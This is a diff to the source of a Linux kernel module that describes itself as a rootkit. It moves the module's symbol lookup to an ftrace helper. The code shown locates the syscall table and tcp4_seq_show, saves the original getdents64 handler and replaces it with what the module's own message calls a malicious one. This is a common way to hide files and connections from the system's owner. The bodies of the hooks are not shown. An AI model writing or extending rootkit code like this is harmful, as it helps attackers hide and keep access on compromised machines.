@@ -2,8 +2,13 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/syscalls.h>
-#include <asm/unistd.h>
+#include <linux/version.h>
+#include <linux/namei.h>
 #include <linux/dirent.h>
+
+//#include "helper.h"
+#include "ftrace_helper.h"
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("ROYCO");
@@ -11,7 +16,7 @@ MODULE_DESCRIPTION("a kernel module rootkit");
 MODULE_VERSION("1");
 
 
-unsigned long (*kallsyms_lookup_name_)(const char *name);
+//unsigned long (*kallsyms_lookup_name_)(const char *name);
 
 unsigned long kallsyms_lookup_addr;
 unsigned long *sys_call_table;
@@ -62,13 +67,14 @@ static int __init rootkit_enter(void) {
 
  printk(KERN_INFO "rootkit is operating\n");
 
- kallsyms_lookup_name_ = (void*)kallsyms_lookup_addr;
+ //kallsyms_lookup_name_ = (void*)kallsyms_lookup_addr;
+ populate_kallsyms_lookup_name(kallsyms_lookup_addr);
  sys_call_table= (unsigned long*)kallsyms_lookup_name_("sys_call_table");
 
  tcp4_seq_show = (void*)kallsyms_lookup_name_("tcp4_seq_show");
  printk(KERN_INFO "found tcp4 function: %lx\n", tcp4_seq_show);
  printk(KERN_INFO "found sys_call_table address: %lx\n",sys_call_table);
-
+ 
  // save old getdents64 function
  old_getdents64 = sys_call_table[__NR_getdents64];
 
@@ -78,6 +84,9 @@ static int __init rootkit_enter(void) {
  set_addr_ro((unsigned long)sys_call_table);
 
  printk(KERN_INFO "switched getdents64 syscall to malicious one");
+
+ 
+
 
  return 0;
 }
